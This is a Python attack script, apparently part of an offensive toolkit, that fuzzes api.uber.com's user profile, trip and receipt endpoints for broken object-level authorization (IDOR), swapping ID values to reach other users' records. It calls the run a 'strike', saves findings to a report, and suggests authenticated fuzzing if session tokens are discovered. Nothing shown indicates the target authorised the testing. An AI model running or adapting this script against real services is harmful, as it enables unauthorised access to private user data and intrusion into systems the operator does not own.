import asyncio
import json
import uuid
from aura.modules.stateful_logic_fuzzer import StatefulLogicFuzzer
from aura.ui.formatter import ZenithFormatter

async def run_bola_strike():
    formatter = ZenithFormatter()
    formatter.banner("Uber API BOLA Strike")
    
    # We target api.uber.com
    fuzzer = StatefulLogicFuzzer(base_url="https://api.uber.com")
    
    # We craft a set of BOLA probes for common endpoints
    # 1. User Profile IDOR
    # 2. Trip Details BOLA
    # 3. Receipt Disclosure
    
    workflow = [
        {
            "id": "user_profile_probe",
            "url": "https://api.uber.com/v1/users/{{USER_ID}}",
            "method": "GET",
            "mutation_types": ["BOLA"],
            "description": "Testing for Unauthorized User Profile Access"
        },
        {
            "id": "trip_details_probe",
            "url": "https://api.uber.com/v1/trips/{{TRIP_ID}}",
            "method": "GET",
            "mutation_types": ["BOLA"],
            "description": "Testing for Unauthorized Trip Data Access"
        },
        {
            "id": "receipt_probe",
            "url": "https://api.uber.com/v1/receipts/{{RECEIPT_ID}}",
            "method": "GET",
            "mutation_types": ["BOLA"],
            "description": "Testing for Receipt Disclosure"
        }
    ]
    
    formatter.phase_banner("Defining BOLA Workflow", "Injecting UUID and numeric ID sequences...")
    steps = fuzzer.define_workflow("Uber_BOLA_Strike", workflow)
    
    formatter.phase_banner("Executing BOLA Strike", "Targeting api.uber.com...")
    # We'll use a set of varied IDs to test resolution and access control
    results = await fuzzer.execute_workflow(steps)
    
    findings = results.findings
            
    if findings:
        formatter.print_findings(findings)
        with open("reports/api_bola_strike_findings.json", "w") as f:
            json.dump(findings, f, indent=4)
    else:
        print("\n[!] No immediate BOLA/IDOR flaws detected via baseline fuzzing.")
        print("[TIP] Consider authenticated BOLA fuzzing if session tokens are discovered.")

if __name__ == "__main__":
    asyncio.run(run_bola_strike())
